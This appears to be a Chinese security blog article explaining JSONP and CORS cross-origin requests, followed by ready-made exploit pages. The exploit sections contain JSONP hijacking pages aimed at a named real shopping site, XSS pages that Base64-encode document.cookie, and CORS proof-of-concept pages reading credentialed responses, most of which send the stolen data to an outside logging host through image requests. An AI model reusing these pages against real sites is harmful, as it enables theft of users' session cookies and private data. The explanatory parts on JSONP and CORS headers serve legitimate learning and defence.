# JSONP和CORS跨站跨域读取资源的漏洞利用（附带EXP）

阅读量 **368882**

|评论 **15**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-20 12:00:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01d103a422e97c3a0f.jpg)

JSONP 教程

<http://www.runoob.com/json/json-jsonp.html>

Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。

## 一、服务端JSONP格式数据

    
    
    <?php
    
    header('Content-type: application/json');
    
    //获取回调函数名
    
    $jsoncallback = htmlspecialchars($_REQUEST ['jsoncallback']);
    
    //json数据
    
    $json_data = '["customername1","customername2"]';
    
    //输出jsonp格式的数据
    
    echo $jsoncallback . "(" . $json_data . ")";
    
    ?>

## 二、客户端实现 callbackFunction 函数

    
    
    <script type="text/javascript">
    
    function callbackFunction(result, methodName)
    
    {
    
        var html = '<ul>';
    
        for(var i = 0; i < result.length; i++)
    
        {
    
            html += '<li>' + result[i] + '</li>';
    
        }
    
        html += '</ul>';
    
        document.getElementById('divCustomers').innerHTML = html;
    
    }
    
    </script>

客户端页面完整代码

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <meta charset="utf-8">
    
    <title>JSONP 实例</title>
    
    </head>
    
    <body>
    
        <div id="divCustomers"></div>
    
        <script type="text/javascript">
    
    function callbackFunction(result, methodName)
    
            {
    
                var html = '<ul>';
    
                for(var i = 0; i < result.length; i++)
    
                {
    
                    html += '<li>' + result[i] + '</li>';
    
                }
    
                html += '</ul>';
    
                document.getElementById('divCustomers').innerHTML = html;
    
            }
    
    </script>
    
    <script type="text/javascript" src="http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction"></script>
    
    </body>
    
    </html>

jQuery 使用 JSONP

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
        <meta charset="utf-8">
    
        <title>JSONP 实例</title>
    
        <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>   
    
    </head>
    
    <body>
    
    <div id="divCustomers"></div>
    
    <script>
    
    $.getJSON("http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=?", function(data) {
    
        var html = '<ul>';
    
        for(var i = 0; i < data.length; i++)
    
        {
    
            html += '<li>' + data[i] + '</li>';
    
        }
    
        html += '</ul>';
    
        $('#divCustomers').html(html);
    
    });
    
    </script>
    
    </body>
    
    </html>

**jQuery – AJAX get() 和 post() 方法**

<http://www.w3school.com.cn/jquery/jquery_ajax_get_post.asp>

**jQuery $.get() 方法**

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>
    
    <script>
    
    $(document).ready(function(){
    
      $("button").click(function(){
    
        $.get("/example/jquery/demo_test.asp",function(data,status){
    
          alert("数据：" + data + "\n状态：" + status);
    
        });
    
      });
    
    });
    
    </script>
    
    </head>
    
    <body>
    
    <button>向页面发送 HTTP GET 请求，然后获得返回的结果</button>
    
    </body>
    
    </html>

<http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js>

**jQuery $.post() 方法**

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
      $("button").click(function(){
    
        $.post("/example/jquery/demo_test_post.asp",
    
        {
    
          name:"Donald Duck",
    
          city:"Duckburg"
    
        },
    
        function(data,status){
    
          alert("数据：" + data + "\n状态：" + status);
    
        });
    
      });
    
    });
    
    </script>
    
    </head>
    
    <body>
    
    
    <button>向页面发送 HTTP POST 请求，并获得返回的结果</button>
    
    
    </body>
    
    </html>

<http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js>

**jQuery AJAX get() 和 post() 方法**

<https://www.runoob.com/jquery/jquery-examples.html>

jQuery get()

使用 $.get() 方法从服务端异步获取数据

<https://www.runoob.com/try/try.php?filename=tryjquery_ajax_get>

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <meta charset="utf-8">
    
    <title>菜鸟教程(runoob.com)</title>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
             $("button").click(function(){
    
                       $.get("/try/ajax/demo_test.php",function(data,status){
    
                                alert("数据: " + data + "\n状态: " + status);
    
                       });
    
             });
    
    });
    
    </script>
    
    </head>
    
    <body>
    
    <button>发送一个 HTTP GET 请求并获取返回结果</button>
    
    </body>
    
    </html>

jQuery post()

使用 $.post() 方法从服务端异步获取数据

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <meta charset="utf-8">
    
    <title>菜鸟教程(runoob.com)</title>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
             $("button").click(function(){
    
                       $.post("/try/ajax/demo_test_post.php",{
    
                                name:"菜鸟教程",
    
                                url:"https://www.runoob.com"
    
                       },
    
                       function(data,status){
    
                                alert("数据: \n" + data + "\n状态: " + status);
    
                       });
    
             });
    
    });
    
    </script>
    
    </head>
    
    <body>
    
    <button>发送一个 HTTP POST 请求页面并获取返回内容</button>
    
    </body>
    
    </html>

**jQuery jsonp跨域请求**

<https://www.cnblogs.com/chiangchou/p/jsonp.html>

**jquery的jsonp方式跨域请求**

最简单的方式，只需配置一个dataType:’jsonp’，就可以发起一个跨域请求。jsonp指定服务器返回的数据类型为jsonp格式，可以看发起的请求路径，自动带了一个callback=xxx，xxx是jquery随机生成的一个回调函数名称。

这里的success就跟上面的showData一样，如果有success函数则默认success()作为回调函数。

    
    
    <%@ page pageEncoding="utf-8" contentType="text/html;charset=UTF-8"  language="java" %>
    
    <html>
    
    <head>
    
        <title>跨域测试</title>
    
        <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>
    
        <script>
    
            $(document).ready(function () {
    
    
                $("#btn").click(function () {
    
                    $.ajax({
    
                        url: "http://localhost:9090/student",
    
                        type: "GET",
    
                        dataType: "jsonp", //指定服务器返回的数据类型
    
                        success: function (data) {
    
                            var result = JSON.stringify(data); //json对象转成字符串
    
                            $("#text").val(result);
    
                        }
    
                    });
    
                });
    
            });
    
        </script>
    
    </head>
    
    <body>
    
        <input id="btn" type="button" value="跨域获取数据" />
    
        <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

回调函数你可以写到<script>下(默认属于window对象)，或者指明写到window对象里，看jquery源码，可以看到jsonp调用回调函数时，是调用的window.callback

然后看调用结果，发现，请求时带的参数是：callback=showData；调用回调函数的时候，先调用了指定的showData，然后再调用了success。所以，success是返回成功后必定会调用的函数，就看你怎么写了。

    
    
    <%@ page pageEncoding="utf-8" contentType="text/html;charset=UTF-8"  language="java" %>
    
    <html>
    
    <head>
    
        <title>跨域测试</title>
    
        <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>
    
        <script>
    
            function showData (data) {
    
                console.info("调用showData");
    
                var result = JSON.stringify(data);
    
                $("#text").val(result);
    
            }
    
            $(document).ready(function () {
    
    //            window.showData = function  (data) {
    
    //                console.info("调用showData");
    
    //
    
    //                var result = JSON.stringify(data);
    
    //                $("#text").val(result);
    
    //            }
    
                $("#btn").click(function () {
    
                    $.ajax({
    
                        url: "http://localhost:9090/student",
    
                        type: "GET",
    
                        dataType: "jsonp",  //指定服务器返回的数据类型
    
                        jsonpCallback: "showData",  //指定回调函数名称
    
                        success: function (data) {
    
                            console.info("调用success");
    
                        }
    
                    });
    
                });
    
            });
    
        </script>
    
    </head>
    
    <body>
    
        <input id="btn" type="button" value="跨域获取数据" />
    
        <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

指定callback这个名称后，后台也需要跟着更改。

    
    
    <%@ page pageEncoding="utf-8" contentType="text/html;charset=UTF-8"  language="java" %>
    
    <html>
    
    <head>
    
        <title>跨域测试</title>
    
        <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>
    
        <script>
    
            function showData (data) {
    
                console.info("调用showData");
    
                var result = JSON.stringify(data);
    
                $("#text").val(result);
    
            }
    
            $(document).ready(function () {
    
                $("#btn").click(function () {
    
                    $.ajax({
    
                        url: "http://localhost:9090/student",
    
                        type: "GET",
    
                        dataType: "jsonp",  //指定服务器返回的数据类型
    
                        jsonp: "theFunction",   //指定参数名称
    
                        jsonpCallback: "showData",  //指定回调函数名称
    
                        success: function (data) {
    
                            console.info("调用success");
    
                        }
    
                    });
    
                });
    
    
            });
    
        </script>
    
    </head>
    
    <body>
    
        <input id="btn" type="button" value="跨域获取数据" />
    
        <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

后台代码：

    
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    
        response.setCharacterEncoding("UTF-8");
    
        response.setContentType("text/html;charset=UTF-8");
    
        //数据
    
        List<Student> studentList = getStudentList();
    
        JSONArray jsonArray = JSONArray.fromObject(studentList);
    
        String result = jsonArray.toString();
    
        //前端传过来的回调函数名称
    
        String callback = request.getParameter("theFunction");
    
        //用回调函数名称包裹返回数据，这样，返回数据就作为回调函数的参数传回去了
    
        result = callback + "(" + result + ")";
    
        response.getWriter().write(result);
    
    }

jsonp方式不支持POST方式跨域请求，就算指定成POST方式，会自动转为GET方式；而后端如果设置成POST方式了，那就请求不了了。

jsonp的实现方式其实就是<script>脚本请求地址的方式一样，只是ajax的jsonp对其做了封装，所以可想而知，jsonp是不支持POST方式的。

总结：jQuery
ajax方式以jsonp类型发起跨域请求，其原理跟<script>脚本请求一样，因此使用jsonp时也只能使用GET方式发起跨域请求。跨域请求需要服务端配合，设置callback，才能完成跨域请求。

## 三、JSONP EXP

### 方法一：JavaScript调用

弹窗代码（弹窗JSON数据）：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script>
    
    function jsoncallback(json){
    
    //new Image().src="http://jsonp.reiwgah.exeye.io/" + JSON.stringify(json)
    
    alert(JSON.stringify(json))
    
    }
    
    </script>
    
    <script src="http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback"></script>
    
    </body>
    
    </html>

获取JSON数据并且Base64编码发送到远程服务器的DNSLOG：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script>
    
    function jsoncallback(json){
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + JSON.stringify(json)
    
    //alert(JSON.stringify(json))
    
    }
    
    </script>
    
    <script src="http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback"></script>
    
    </body>
    
    </html>
    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script>
    
    function jsoncallback(json){
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(JSON.stringify(json))))
    
    //alert(JSON.stringify(json))
    
    }
    
    </script>
    
    <script src="http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback"></script>
    
    </body>
    
    </html>

### 方法二：jQuery jsonp跨域请求

弹窗代码（弹窗JSON数据）：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
    $("#button").click(function(){
    
    $.ajax({
    
    url: "http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback",
    
    type: "GET",       //指定GET请求方法
    
    dataType: "jsonp", //指定服务器返回的数据类型
    
    jsonp: "callback", //指定参数名称
    
    jsonpCallback: "jsoncallback",
    
    //指定回调函数名称
    
    success: function (data) {
    
    var result = JSON.stringify(data);
    
    //json对象转成字符串
    
    $("#text").val(result);
    
    }
    
    })
    
    })
    
    })
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

获取JSON数据并且Base64编码发送到远程服务器的DNSLOG：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
    $("#button").click(function(){
    
    $.ajax({
    
    url: "http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback",
    
    type: "GET",       //指定GET请求方法
    
    dataType: "jsonp", //指定服务器返回的数据类型
    
    jsonp: "callback", //指定参数名称
    
    jsonpCallback: "jsoncallback",
    
    //指定回调函数名称
    
    success: function (data) {
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(JSON.stringify(data))))
    
    //var result = JSON.stringify(data);
    
    //json对象转成字符串
    
    //$("#text").val(result);
    
    }
    
    })
    
    })
    
    })
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>
    

两者同时操作：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(document).ready(function(){
    
    $("#button").click(function(){
    
    $.ajax({
    
    url: "http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback",
    
    type: "GET",       //指定GET请求方法
    
    dataType: "jsonp", //指定服务器返回的数据类型
    
    jsonp: "callback", //指定参数名称
    
    jsonpCallback: "jsoncallback",
    
    //指定回调函数名称
    
    success: function (data) {
    
    var result = JSON.stringify(data);
    
    //json对象转成字符串
    
    $("#text").val(result);
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(result)))
    
    }
    
    })
    
    })
    
    })
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

### 方法三：jQuery JacaScript调用

弹窗代码（弹窗JSON数据）：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    //回调函数
    
    function jsoncallback (result) {
    
    var data = JSON.stringify(result); //json对象转成字符串
    
    $("#text").val(data);
    
    }
    
    $(document).ready(function () {
    
    $("#button").click(function () {
    
    //向头部输入一个脚本，该脚本发起一个跨域请求
    
    $("head").append("<script src='http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback'><\/script>");
    
    });
    
    });
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>
    

获取JSON数据并且Base64编码发送到远程服务器的DNSLOG：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    //回调函数
    
    function jsoncallback (result) {
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(JSON.stringify(result))))
    
    //var data = JSON.stringify(result); //json对象转成字符串
    
    //$("#text").val(data);
    
    }
    
    $(document).ready(function () {
    
    $("#button").click(function () {
    
    //向头部输入一个脚本，该脚本发起一个跨域请求
    
    $("head").append("<script src='http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback'><\/script>");
    
    });
    
    });
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>
    

两者同时操作：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>JSONP EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    //回调函数
    
    function jsoncallback (result) {
    
    var data = JSON.stringify(result); //json对象转成字符串
    
    $("#text").val(data);
    
    new Image().src="http://jsonp.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(data)))
    
    }
    
    $(document).ready(function () {
    
    $("#button").click(function () {
    
    //向头部输入一个脚本，该脚本发起一个跨域请求
    
    $("head").append("<script src='http://m.gome.com.cn/active/userAgent?bust=1531376973100&=undefined&callback=jsoncallback'><\/script>");
    
    });
    
    });
    
    </script>
    
    <input id="button" type="button" value="发送一个JSONP请求并获取返回结果" />
    
    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
    
    </body>
    
    </html>

XSS EXP：

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>XSS EXP</title>
    
    </head>
    
    <body>
    
    <script>
    
    function xss(){
    
    new Image().src="http://xss.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(document.cookie)))};
    
    setTimeout(xss,3000);
    
    </script>
    
    </body>
    
    </html>
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>XSS EXP</title>
    
    </head>
    
    <body>
    
    <script>
    
    function xss(){
    
    new Image().src="http://xss.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(document.cookie)))};
    
    xss();
    
    </script>
    
    </body>
    
    </html>

## 四、CORS

跨域资源共享 CORS 详解

<http://www.ruanyifeng.com/blog/2016/04/cors.html>

CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。

它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。

CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。

整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。

因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。

浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。

（1) 请求方法是以下三种方法之一：

HEAD

GET

POST

（2）HTTP的头信息不超出以下几种字段：

Accept

Accept-Language

Content-Language

Last-Event-ID

Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain

对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。

上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。

如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。

如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。

Access-Control-Allow-Origin: http://api.bob.com

Access-Control-Allow-Credentials: true

Access-Control-Expose-Headers: FooBar

Content-Type: text/html; charset=utf-8

（1）Access-Control-Allow-Origin

该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。

（2）Access-Control-Allow-Credentials

该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。

（3）Access-Control-Expose-Headers

该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(‘FooBar’)可以返回FooBar字段的值。

上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。

Access-Control-Allow-Credentials: true

另一方面，开发者必须在AJAX请求中打开withCredentials属性。

var xhr = new XMLHttpRequest();

xhr.withCredentials = true;

需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。

非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。

非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。

浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。

上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。

预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。

（1）Access-Control-Request-Method

该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。

（2）Access-Control-Request-Headers

该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。

服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。

上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。

Access-Control-Allow-Origin: *

如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。

XMLHttpRequest cannot load <http://api.alice.com>.

Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.

（1）Access-Control-Allow-Methods

该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。

（2）Access-Control-Allow-Headers

如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。

（3）Access-Control-Allow-Credentials

该字段与简单请求时的含义相同。

（4）Access-Control-Max-Age

该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。

一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。

CORS与JSONP的使用目的相同，但是比JSONP更强大。

SONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。

Exploiting Misconfigured CORS (Cross Origin Resource Sharing)

<https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/>

POORLY IMPLEMENTED, BEST CASE FOR ATTACK:

Access-Control-Allow-Origin: https://attacker.com

Access-Control-Allow-Credentials: true

POORLY IMPLEMENTED, EXPLOITABLE:

Access-Control-Allow-Origin: null

Access-Control-Allow-Credentials: true

BAD IMPLEMENTATION BUT NOT EXPLOITABLE:

Access-Control-Allow-Origin: *

Access-Control-Allow-Credentials: true

or just

Access-Control-Allow-Origin: *

    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <h3>Extract SID</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open("GET", "https://target.com/info/", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    document.getElementById("demo").innerHTML = this.responseText;
    
    }
    
    };
    
    xhttp.open("GET", "YOUR_ENDPOINT GOES HERE", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    

EXP1:

    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <h3>Extract SID</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open("GET", "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02&_=1531712664191", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    document.getElementById("demo").innerHTML = this.responseText;
    
    }
    
    };
    
    xhttp.open("GET", "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02&_=1531712664191", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    new Image().src="http://cors.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(this.responseText)))
    
    }
    
    };
    
    xhttp.open("GET", "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02&_=1531712664191", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <center>
    
    <h2>CORS POC Exploit</h2>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200) {
    
    new Image().src="http://cors.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(this.responseText)))
    
    }
    
    };
    
    xhttp.open("GET", "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02", true);
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </body>
    
    </html>
    

EXP2:

    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
    <head>
    
    <meta charset="UTF-8">
    
    <title>CORS EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(function() {
    
    var options = {
    
    type: 'get',
    
    xhrFields: {withCredentials: true},
    
    url: "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02",
    
    success: function (result) {
    
    alert(JSON.stringify(result));
    
    }
    
    };
    
    $("#btn1").click(function ()
    
    {
    
    $.ajax(options);
    
    });
    
    });
    
    </script>
    
    <input type="button" id="btn1" value="发送一个CORS请求并获取返回结果"/>
    
    </body>
    
    </html>
    
    
    
    <!DOCTYPE html>
    
    <html lang="en">
    
